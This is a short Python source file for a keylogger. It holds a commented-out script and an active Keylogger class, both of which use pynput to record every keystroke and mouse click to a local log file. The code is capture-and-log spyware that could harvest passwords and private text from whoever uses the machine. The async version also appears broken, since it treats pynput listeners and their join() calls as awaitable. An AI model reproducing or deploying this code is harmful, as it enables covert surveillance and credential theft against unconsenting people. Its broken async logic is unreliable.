# import os
# from pynput.keyboard import Key, Listener
# from pynput.mouse import Listener as MouseListener

# # Function to create folder tree
# def create_folder_tree():
#     folders = ["logs", "instructions"]  # Add more folders if needed
#     for folder in folders:
#         os.makedirs(folder, exist_ok=True)

# # Call the function to create the folder tree
# create_folder_tree()

# # Function to handle keyboard events
# def on_press(key):
#     with open("logs/log.txt", "a") as f:
#         f.write(f"Key pressed: {key}\n")

# # Function to handle mouse events
# def on_click(x, y, button, pressed):
#     with open("logs/log.txt", "a") as f:
#         if pressed:
#             f.write(f"Mouse clicked at ({x}, {y}) with button {button}\n")

# # Start listening for keyboard and mouse events
# with Listener(on_press=on_press) as k_listener, MouseListener(on_click=on_click) as m_listener:
#     k_listener.join()
#     m_listener.join()


import os
import asyncio
from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener

class Keylogger:
    def __init__(self):
        self.log_file = "logs/log.txt"
        self.create_folder_tree()
        self.log_handle = open(self.log_file, "a")

    def create_folder_tree(self):
        folders = ["logs", "instructions"]
        for folder in folders:
            os.makedirs(folder, exist_ok=True)

    def on_press(self, key):
        self.log_handle.write(f"Key pressed: {key}\n")

    def on_click(self, x, y, button, pressed):
        if pressed:
            self.log_handle.write(f"Mouse clicked at ({x}, {y}) with button {button}\n")

    async def start_logging(self):
        async with Listener(on_press=self.on_press) as k_listener, MouseListener(on_click=self.on_click) as m_listener:
            await asyncio.gather(k_listener.join(), m_listener.join())

    def stop_logging(self):
        self.log_handle.close()

async def main():
    keylogger = Keylogger()
    await keylogger.start_logging()

if __name__ == "__main__":
    asyncio.run(main())
